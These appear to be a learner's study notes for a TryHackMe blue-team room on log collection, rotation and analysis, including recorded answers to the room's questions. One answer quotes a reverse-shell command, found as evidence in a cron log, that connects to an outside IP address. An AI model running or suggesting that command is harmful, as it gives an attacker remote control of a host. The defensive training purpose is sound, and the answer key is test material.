#logs

Linux Logs: https://tryhackme.com/room/introtologs
Windows: https://tryhackme.com/room/windowseventlogs

A web server of **SwiftSpend Financial** is constantly bombarded with scans from an adversary. As a systems administrator of this organization tasked to address this predicament, you must identify what the adversary is doing by configuring logging and analyzing collected logs

## Log data

```
timstamp
unique identifier
source
execution context
description
severity level
additional info
```

log data is aggregated, analyzed, and cross-referenced with other sources of information, it becomes a potent investigation tool.

```
what happended
attacker confirmed to have access to SwiftSpend Financial GitLab instance

when did it happen
22:10 Wed Sept 8, 2023

where did it happen
originated from device with IP 10.10.133.168 VPN 10.10.133.0/24

who 
User-Agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", was allocated the IP address 10.10.133.168.

successful?
yes
API key found publically exposed on GitLab via web sehll

result of action?
attack RCE on gitlab.swiftspend.finance and did post-exploit actions
```

  
What is the name of your colleague who left a note on your Desktop?
- Perry
  
What is the full path to the suggested log file for initial investigation?
- ` /var/log/gitlab/nginx/access.log `

## Log types

- **Application Logs:** Messages about specific applications, including status, errors, warnings, etc.
- **Audit Logs:** Activities related to operational procedures crucial for regulatory compliance.
- **Security Logs:** Security events such as logins, permissions changes, firewall activity, etc.
- **Server Logs:** Various logs a server generates, including system, event, error, and access logs.
- **System Logs:** Kernel activities, system errors, boot sequences, and hardware status.
- **Network Logs:** Network traffic, connections, and other network-related events.
- **Database Logs:** Activities within a database system, such as queries and updates.
- **Web Server Logs:** Requests processed by a web server, including URLs, response codes, etc.

LOG FORMATS

- semi-structured logs 
	- syslog message format: logs protocol for system and network
	- windows event log (EVTX) format 
	- 
- structured logs = strict and standardized format for parsing and analyzing
	- field delimited format = CSV, TSV
	- JSON
	- W3C extended log format (ELF): used by Microsoft Internet Info Services (IIS) web server
	- XML
	- 
- unstructured logs = free form text , hard to parse
	- NCSA common log format (CLF): standardized web server log format for client requests, Apache HTTP server default
	- NCSA combined log format (combined): CLF+, Nginx HTTP server default

can customize formats for specific uses

LOG STANDARDS
guidelines or specifications that define how logs should be generated, transmitted, stored
- Common event expression (CEE): by the MITRE  https://cee.mitre.org/
- OWASP logging cheat sheet  https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
- Syslog protocol  https://datatracker.ietf.org/doc/html/rfc5424
- NIST special publication 800-92  https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-92.pdf
- Azure monitor logs  https://learn.microsoft.com/en-us/azure/azure-monitor/logs/data-platform-logs
- Google cloud logging  https://docs.oracle.com/en-us/iaas/Content/Logging/Concepts/loggingoverview.htm
- Virginia Tech sample log review https://it.vt.edu/content/dam/it_vt_edu/policies/Standard_for_Information_Technology_Logging.pdf

---
Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?
- web server log

Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?
- Nginx logs > NCSA combined log format
- combined

## Log collection

Utilizing the **Network Time Protocol (NTP)** is a method to achieve this synchronization and ensure the integrity of the timeline stored in the logs.

1. ID sources: list all potential log sources (servers, databases, apps, network devices)
2. choose a log collector software
3. configure collection parameters: ensure time synch in enabled 
4. test collection 

`ntpdate pool.ntp.org`

## Log Management

Once you've collated your logs, effective management of them is paramount. These steps can be followed to achieve this:

- **Storage:** Decide on a secure storage solution, considering factors like retention period and accessibility.
- **Organisation:** Classify logs based on their source, type, or other criteria for easier access later.
- **Backup:** Regularly back up your logs to prevent data loss.
- **Review:** Periodically review logs to ensure they are correctly stored and categorized.

## Log Central

Centralizing your logs can significantly streamline access and analysis.
- **Choose a Centralised System:** Opt for a system that consolidates logs from all sources, such as the Elastic Stack or Splunk.
- **Integrate Sources:** Connect all your log sources to this centralised system.
- **Set Up Monitoring:** Utilise tools that provide real-time monitoring and alerts for specified events.
- **Integration with Incident Management:** Ensure that your centralized system can integrate seamlessly with any incident management tools or protocols you have in place.

## activity

use `rsyslog` for centralization and management of logs
```
# rsyslog all sshd messages /var/log/websrv-02/rsyslog_sshd.log

sudo systemctl status rsyslog

# make a config file
gedit /etc/rsyslog.d/98-websrv-02-sshd.conf

# add 
$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log

# save close > sudo systemctl restart rsyslog
cd /var/log/websrv-02/
ls -la

```

After configuring` rsyslog` for `sshd`, what username repeatedly appears in the `sshd` logs at `/var/log/websrv-02/rsyslog_sshd.log`, indicating failed login attempts or brute forcing?
- ` grep -i user rsyslog_sshd.log | sort `
- `stansimon `

What is the IP address of SIEM-02 based on the `rsyslog` configuration file `/etc/rsyslog.d/99-websrv-02-cron.conf,` which is used to monitor cron messages?
- ` cd /etc/rsyslog.d/ && cat 99-websrv-02-cron.conf`
- ` 10.10.10.101 `

Based on the generated logs in `/var/log/websrv-02/rsyslog_cron.log`, what command is being executed by the root user?
- ` cd /var/log/websrv-02 && cat rsyslog_cron.log `
- `cat rsyslog_cron.log | grep CMD `
- ` /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1") `

## Log Storage

- **Security Requirements:** Ensuring that logs are stored in compliance with organisational or regulatory security protocols.
- **Accessibility Needs:** How quickly and by whom the logs need to be accessed can influence the choice of storage.
- **Storage Capacity:** The volume of logs generated may require significant storage space, influencing the choice of storage solution.
- **Cost Considerations:** The budget for log storage may dictate the choice between cloud-based or local solutions.
- **Compliance Regulations:** Specific industry regulations governing log storage can affect the choice of storage.
- **Retention Policies:** The required retention time and ease of retrieval can affect the decision-making process.
- **Disaster Recovery Plans:** Ensuring the availability of logs even in system failure may require specific storage solutions.

## Log retention

It is vital to recognise that log storage is not infinite. Therefore, a reasonable balance between retaining logs for potential future needs and the storage cost is necessary. Understanding the concepts of Hot, Warm, and Cold storage can aid in this decision-making:

- **Hot Storage:** Logs from the past **3-6 months** that are most accessible. Query speed should be near real-time, depending on the complexity of the query.
- **Warm Storage:** Logs from **six months to 2 years**, acting as a data lake, easily accessible but not as immediate as Hot storage.
- **Cold Storage:** Archived or compressed logs from **2-5 years**. These logs are not easily accessible and are usually used for retroactive analysis or scoping purposes.

## Log deletion

Log deletion must be performed carefully to avoid removing logs that could still be of value. The backup of log files, especially crucial ones, is necessary before deletion.

It is essential to have a well-defined deletion policy to ensure compliance with data protection laws and regulations. Log deletion helps to:

- Maintain a manageable size of logs for analysis.
- Comply with privacy regulations, such as GDPR, which require unnecessary data to be deleted.
- Keep storage costs in balance.

Best Practices: Log Storage, Retention and Deletion

- Determine the storage, retention, and deletion policy based on both business needs and legal requirements.
- Regularly review and update the guidelines per changing conditions and regulations.
- Automate the storage, retention, and deletion processes to ensure consistency and avoid human errors.
- Encrypt sensitive logs to protect data.
- Regular backups should be made, especially before deletion.

## activity

`logrotate` tool that automates log file rotation, compression and management

```
/var/log/websrv-02/rsyslog_sshd.log
sudo nano /etc/logrotate.d/98-websrv-02_sshd.conf

add

/var/log/websrv-02/rsyslog_sshd.log {
    daily
    rotate 30
    compress
    lastaction
        DATE=$(date +"%Y-%m-%d")
        echo "$(date)" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
        for i in $(seq 1 30); do
            FILE="/var/log/websrv-02/rsyslog_sshd.log.$i.gz"
            if [ -f "$FILE" ]; then
                HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
                echo "rsyslog_sshd.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
            fi
        done
        systemctl restart rsyslog
    endscript
}

save and close
sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf

```

Based on the `logrotate` configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, how many versions of old compressed log file copies will be kept?
- `cat 99-websrv-02_cron.conf `
- 24

Based on the `logrotate` configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, what is the log rotation frequency?
- hourly

## Log analysis process

Log analysis involves Parsing, Normalisation, Sorting, Classification, Enrichment, Correlation, Visualisation, and Reporting. It can be done through various tools and techniques, ranging from complex systems like Splunk and ELK to ad-hoc methods ranging from default command-line tools to open-source tools.

- data sources = systems or app logs files
- parsing = break down the log data
- normalization = standardizing parsed data 
- sorting = sort vital info for log analysis
- classification = assign categories to the logs based on their characteristics 
- enrichment = adding info , geo data, threat intel etc
- correlation = linking related records and ID connections between log entries 
- visualization= charts, graphs
- reporting = summarize log data into structured formats

## Log analysis tools

Security Information and Event Management (SIEM) tools such as Splunk or Elastic Search can be used for complex log analysis tasks.

Linux 
```
cat grep sed sort uniq awk sha256sum
```

## Log analysis techniques

Log analysis techniques are methods or practices used to interpret and derive insights from log data. These techniques can range from simple to complex and are vital for identifying patterns, anomalies, and critical insights. Here are some common techniques:

- pattern recognition
- anomaly detection
- correlation
- timeline analysis
- machine learning and AI
- visualization
- statistical analysis

## Application

Working with logs is a complex task requiring both comprehension and manipulation of data. This tutorial covers two scenarios. The first is handling unparsed raw log files accessed directly via an open-source [Log Viewer](https://github.com/sevdokimov/log-viewer) tool. This method allows immediate analysis without preprocessing, which is ideal for quick inspections or preserving the original format.

- https://github.com/sevdokimov/log-viewer

```
AttackBox browser 

http://10.10.205.53:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log

http://10.10.205.53:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log

  
Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters?

- no date field

  
What is the process of standardising parsed data into a more easily readable and query-able format?

- normalisation

  
What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?

- enrichment

```

---
If you enjoyed this room, continue learning and developing proficiency in areas specific to Security Operations and Incident Response tooling, which may enhance your log analysis and overall Blue Teaming skills such as the following:

- **Endpoint Detection and Response (EDR)**
    
    - [Intro to Endpoint Security](https://tryhackme.com/room/introtoendpointsecurity)
    - [Aurora EDR](https://tryhackme.com/room/auroraedr)
    - [Wazuh](https://tryhackme.com/room/wazuhct)
  
- **Intrusion Detection and Prevention Systems (IDPS)**
    
    - [Snort](https://tryhackme.com/room/snort)
    - [Snort Challenge: The Basics](https://tryhackme.com/room/snortchallenges1)
    - [Snort Challenge: Live Attacks](https://tryhackme.com/room/snortchallenges2)

- **Security Information and Event Management (SIEM)**
    
    - [Investigating with ELK 101](https://tryhackme.com/room/investigatingwithelk101)
    - [Splunk: Basics](https://tryhackme.com/room/splunk101)
    - [Incident handling with Splunk](https://tryhackme.com/room/splunk201)

 the next room, [Log Operations](https://tryhackme.com/room/logoperations). May you harness this knowledge to fortify defences, detect adversaries, and drive your cyber security endeavours forward.
